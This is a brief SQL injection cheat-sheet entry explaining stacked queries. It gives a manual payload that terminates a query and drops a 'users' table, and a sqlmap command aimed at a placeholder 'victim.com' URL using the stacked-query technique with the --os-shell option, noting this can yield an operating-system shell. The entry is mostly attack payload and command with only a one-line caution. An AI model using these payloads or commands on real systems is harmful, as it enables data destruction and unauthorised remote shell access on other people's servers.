Stacked Queries (when multiple statements are allowed)

Idea: Execute more than one query at once.

Manual Payload Example (MySQL/Postgres):

'; DROP TABLE users;--


First ends the legit query, second deletes the table.
(Dangerous, usually filtered in modern apps.)

sqlmap Command:

sqlmap -u "http://victim.com/page.php?id=1" -p id --technique=S --os-shell


ðŸ‘‰ Can sometimes get an OS shell if DB has permissions.
